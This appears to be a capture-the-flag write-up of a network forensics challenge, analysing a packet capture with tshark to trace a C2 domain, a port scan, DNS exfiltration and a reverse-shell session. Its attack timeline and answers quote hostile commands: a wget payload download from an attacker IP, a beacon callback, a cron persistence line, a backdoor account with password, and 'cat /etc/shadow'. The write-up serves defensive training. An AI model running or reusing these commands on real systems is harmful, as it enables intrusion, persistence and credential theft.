# Challenge 03 — Network Forensics

## Overview

| Field | Details |
|-------|---------|
| Challenge | 03 — Network Forensics |
| Category | Digital Forensics & Incident Response (DFIR) |
| Difficulty | Easy |
| Date | 2026-03-29 |
| Flags Captured | 5/5 |

## Scenario

A PCAP file was captured from the network perimeter during the attack window. IDS alerts from Suricata have also been provided. The goal was to analyze the network traffic to identify attack patterns and data exfiltration.

## Evidence Files

| File | Description |
|------|-------------|
| `capture.pcap` | Network capture from perimeter |
| `ids-alerts.json` | Suricata IDS alert log |

## Tools Used

| Tool | Purpose |
|------|---------|
| `tshark` | Command line packet capture analysis |
| `sort` | Sort output for analysis |
| `uniq` | Count unique occurrences |
| `wc` | Count lines/words |
| `base64` | Decode base64 encoded data |
| `xxd` | Convert hex to ASCII |

---

## What is tshark?

tshark is the command line version of Wireshark — it reads and filters PCAP files without needing a GUI. A PCAP (Packet Capture) file is a recording of all network traffic at a specific point in time. Just like Volatility analyzes RAM, tshark analyzes network traffic to reconstruct what happened on the wire during an attack.

---

## Flag 3.1 — C2 Domain

**Question:** What domain resolves to the C2 server?

**Command:**
```bash
sudo tshark -r capture.pcap -Y "dns"
```

**Finding:**
```
evil-c2.example.com
```

**Analysis:**

Filtering the PCAP for DNS traffic revealed queries to an attacker-controlled domain. The domain `evil-c2.example.com` resolved to `203.0.113.99` — the same C2 IP identified in Challenge 01 (UFW firewall log) and Challenge 02 (beacon command line arguments). This cross-challenge correlation confirms the attacker's infrastructure.

**Flag:** `FLAG{evil-c2.example.com}`

**Screenshot:** `03-3_1-dns-traffic.png`, `03-3_1-c2-dns-filter.png`

---

## Flag 3.2 — Internal IP of the Compromised Host

**Question:** What is the internal IP of the compromised host?

**Command:**
```bash
sudo tshark -r capture.pcap -q -z endpoints,ip
```

**Finding:**
```
10.0.1.50
```

**Analysis:**

The endpoints statistics show all IP addresses that appeared in the capture. `10.0.1.50` stood out as the internal host with the highest traffic volume, direct communication with the C2 server (`203.0.113.99`), and DNS exfiltration activity. This matches the source IP seen in the UFW firewall log from Challenge 01:

```
SRC=10.0.1.50 DST=203.0.113.99 DPT=4444
```

**Flag:** `FLAG{10.0.1.50}`

**Screenshot:** `03-3_2-ip-endpoints.png`, `03-3_2-c2-traffic.png`

---

## Flag 3.3 — Number of Ports Scanned

**Question:** How many ports were scanned? (exact number)

**Command:**
```bash
sudo tshark -r capture.pcap -Y "ip.src == 198.51.100.47 && tcp.flags.syn == 1 && tcp.flags.ack == 0" -T fields -e tcp.dstport | sort -n | uniq | wc -l
```

**Output:**
```
5
```

**Analysis:**

The command filters for TCP SYN packets (the first packet in a TCP handshake) from the attacker's IP `198.51.100.47`. SYN packets without ACK are the signature of a port scan — the attacker sends a SYN to each port to see which ones respond. The attacker scanned exactly 5 ports:

- 22 (SSH)
- 80 (HTTP)
- 443 (HTTPS)
- 8080 (Alternative HTTP)
- 3306 (MySQL)

This was a targeted scan rather than a noisy full-port scan — the attacker already knew what services to look for.

**Flag:** `FLAG{5}`

**Screenshot:** `03-3_3-syn-scan.png`, `03-3_3-port-count.png`

---

## Flag 3.4 — DNS Exfiltration Data

**Question:** What data exfiltration method used DNS? (decode the base64 subdomain)

**Command:**
```bash
echo "c3RvbGVuX2NyZWRlbnRpYWxz" | base64 -d
```

**Output:**
```
stolen_credentials
```

**Analysis:**

The PCAP revealed DNS queries where the subdomain contained base64-encoded data:

```
c3RvbGVuX2NyZWRlbnRpYWxz.data.evil-c2.example.com
```

DNS exfiltration is a stealthy technique — instead of sending data directly to the C2 server, the attacker encodes stolen data into DNS subdomain queries. Since DNS traffic is commonly allowed through firewalls, this method evades traditional network monitoring. Decoding the base64 subdomain revealed the attacker was exfiltrating `stolen_credentials` — consistent with the credential harvesting we identified in Challenge 02 (`/etc/shadow`, SSH keys, bash history).

**Flag:** `FLAG{stolen_credentials}`

**Screenshot:** `03-3_4-base64-decode.png`

---

## Flag 3.5 — Reverse Shell Credential Access Command

**Question:** What command did the attacker run to access credentials via the reverse shell?

**Step 1 — Identify the TCP stream:**
```bash
sudo tshark -r capture.pcap -T fields -e tcp.stream -Y "tcp.port == 4444" | sort -n | uniq
```

**What this does:** finds all TCP streams involving port 4444 — our known C2 callback port from Challenge 01.

**Step 2 — Reconstruct the reverse shell session:**
```bash
sudo tshark -r capture.pcap -q -z follow,tcp,ascii,190
```

**What this does:** follows TCP stream 190 and displays the full conversation in ASCII — showing exactly what commands the attacker typed and what responses they received.

**Recovered Commands:**
```
id
whoami
cat /etc/shadow
```

**Analysis:**

Following the TCP stream on port 4444 reconstructed the attacker's reverse shell session. After confirming their identity with `id` and `whoami`, the attacker ran `cat /etc/shadow` to read the password hash file. This is consistent with the bash history recovered in Challenge 02 and the exfiltration archive that included `/etc/shadow`.

**Flag:** `FLAG{cat /etc/shadow}`

**Screenshot:** `03-3_5-follow-correct-stream.png`, `03-3_5-flag-submitted.png`

---

## Full Attack Timeline (Challenges 01 + 02 + 03 Combined)

```
02:55:00 → Attacker scans with DirBuster (apache-access.log)
02:55:00 → Targeted port scan: 22, 80, 443, 8080, 3306 (capture.pcap)
03:30:00 → Web shell uploaded: /uploads/shell.php
03:31:00 → Web shell tested: id, whoami, cat /etc/passwd
03:32:00 → Payload downloaded: wget http://198.51.100.47/payload.elf
03:32:00 → Beacon executed: /tmp/.update/beacon -c 203.0.113.99 -p 443 -e aes256
03:33:00 → cat /etc/shadow via reverse shell
03:33:00 → Sensitive files exfiltrated to /var/tmp/.cache/exfil.tar.gz
03:33:00 → DNS exfiltration: stolen_credentials → evil-c2.example.com
03:33:00 → Backdoor user created: svc-backup (Sup3rS3cret!)
03:34:00 → SSH key added: /home/svc-backup/.ssh/authorized_keys
03:45:00 → Crontab edited: */5 * * * * /tmp/.hidden/beacon.sh
03:47:00 → C2 callback confirmed: 203.0.113.99:4444 (UFW + PCAP correlated)
03:50:00 → Rootkit loaded: rootkit_mod hiding PID 31337
```

---

## Key Takeaways

- DNS traffic reveals both C2 infrastructure and covert data exfiltration channels
- Traffic volume and communication patterns identify compromised internal hosts
- SYN packet analysis exposes reconnaissance — even targeted scans leave traces
- Base64 encoding in DNS subdomains is a common stealth exfiltration technique
- TCP stream reconstruction reveals the exact commands run during a reverse shell session
- Network evidence corroborates findings from log analysis and memory forensics
- Every challenge tells the same story from a different angle — correlation is key
